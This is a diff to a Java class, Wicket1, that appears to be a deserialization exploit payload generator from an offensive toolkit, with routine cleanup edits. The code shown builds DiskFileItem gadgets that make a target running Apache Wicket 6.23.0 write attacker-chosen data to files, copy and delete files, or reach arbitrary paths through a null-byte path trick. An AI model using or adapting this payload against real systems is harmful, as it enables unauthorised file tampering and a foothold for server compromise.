@@ -9,8 +9,8 @@ import org.apache.wicket.util.io.ThresholdingOutputStream;
 import org.apache.wicket.util.upload.DiskFileItem;
 
 import java.io.File;
-import java.io.IOException;
 import java.io.OutputStream;
+import java.nio.charset.StandardCharsets;
 import java.util.Arrays;
 
 /**
@@ -41,24 +41,25 @@ import java.util.Arrays;
  * $ cat /tmp/upload_3805815b_2d50_4e00_9dae_a854d5a0e614_479431761.tmp
  * blue lobster
  */
+@SuppressWarnings({"unused"})
 @Dependencies({"org.apache.wicket:wicket-util:6.23.0", "org.slf4j:slf4j-api:1.6.4"})
 @Authors({Authors.JACOBAINES})
 public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {
-    private static DiskFileItem copyAndDelete(String copyAndDelete, String copyTo) throws IOException, Exception {
+    private static DiskFileItem copyAndDelete(String copyAndDelete, String copyTo) throws Exception {
         return makePayload(0, copyTo, copyAndDelete, new byte[1]);
     }
 
     // writes data to a random filename (update_<per JVM random UUID>_<COUNTER>.tmp)
-    private static DiskFileItem write(String dir, byte[] data) throws IOException, Exception {
+    private static DiskFileItem write(String dir, byte[] data) throws Exception {
         return makePayload(data.length + 1, dir, dir + "/whatever", data);
     }
 
     // writes data to an arbitrary file
-    private static DiskFileItem writeOldJRE(String file, byte[] data) throws IOException, Exception {
+    private static DiskFileItem writeOldJRE(String file, byte[] data) throws Exception {
         return makePayload(data.length + 1, file + "\0", file, data);
     }
 
-    private static DiskFileItem makePayload(int thresh, String repoPath, String filePath, byte[] data) throws IOException, Exception {
+    private static DiskFileItem makePayload(int thresh, String repoPath, String filePath, byte[] data) throws Exception {
         // if thresh < written length, delete outputFile after copying to repository temp file
         // otherwise write the contents to repository temp file
         File repository = new File(repoPath);
@@ -84,11 +85,11 @@ public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {
         if ("copyAndDelete".equals(parts[0])) {
             return copyAndDelete(parts[1], parts[2]);
         } else if ("write".equals(parts[0])) {
-            return write(parts[1], parts[2].getBytes("US-ASCII"));
+            return write(parts[1], parts[2].getBytes(StandardCharsets.US_ASCII));
         } else if ("writeB64".equals(parts[0])) {
             return write(parts[1], Base64.decodeBase64(parts[2]));
         } else if ("writeOld".equals(parts[0])) {
-            return writeOldJRE(parts[1], parts[2].getBytes("US-ASCII"));
+            return writeOldJRE(parts[1], parts[2].getBytes(StandardCharsets.US_ASCII));
         } else if ("writeOldB64".equals(parts[0])) {
             return writeOldJRE(parts[1], Base64.decodeBase64(parts[2]));
         }
